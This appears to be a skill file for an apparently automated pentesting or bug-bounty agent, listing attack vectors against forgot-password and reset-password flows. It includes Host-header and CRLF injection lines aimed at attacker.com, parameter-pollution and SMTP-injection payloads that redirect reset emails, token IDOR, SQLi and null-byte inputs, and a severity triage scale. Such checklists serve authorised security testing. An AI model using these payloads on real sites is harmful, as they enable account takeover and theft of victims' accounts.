# SKILL: password-reset-flow
## Triggers
Forgot-password / reset-password endpoints.
## Vectors
1. Host-header injection in reset link -> host-header-injection.md
2. HPP: email=victim&email=attacker, email[]=x, {"email":[...]}
3. IDOR on reset token: guess, increment, reuse
4. Broken token crypto; token doesn't expire
5. Token leaked via Referer, response body, or JS
6. Session-variable trick bypasses the token check
7. Only-space password accepted
8. Two reset links issued; older one still works
9. SMTP injection: email=victim@x%0d%0aCC:attacker@x
10. Param-miner uid/id swap -> IDOR
11. Host override: POST https://attacker.com/reset.php, @attacker.com/reset.php, /reset.php@attacker.com
12. SQLi in email/token param; append .json to dodge response checks
13. CRLF: /resetpassword?%0d%0aHost:%20attacker.com
14. Spaced username collides with a victim's reset
## Payloads
{"email":"mehul@x.com%00"}
{"username":" victim ","email":"attacker@x"}
## Triage
Reset-token takeover -> Critical. Email-enumeration leak -> Low/Medium.
